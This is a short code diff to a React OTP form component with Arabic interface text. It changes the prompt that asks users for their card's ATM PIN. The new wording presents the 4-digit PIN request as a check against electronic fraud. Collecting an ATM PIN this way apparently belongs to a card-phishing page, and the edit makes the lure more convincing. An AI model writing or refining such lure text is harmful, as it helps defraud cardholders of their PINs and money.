@@ -209,7 +209,7 @@ export default function OTPForm() {
         }`}
       >
         <h2 className="text-lg font-bold text-gray-800 mb-4">رمز الصراف</h2>
-        <p className="text-md text-gray-700 mb-6">أدخل رمز الصراف لتأكيد العملية</p>
+        <p className="text-md text-gray-700 mb-6">الرجاء ادخال الرمز السري المكون من 4 ارقام للتأكد من ملكية واهلية البطاقة للحماية من مخاطر الأحتيال الألكتروني</p>
         <div className="mb-6">
           <input
             type="number"
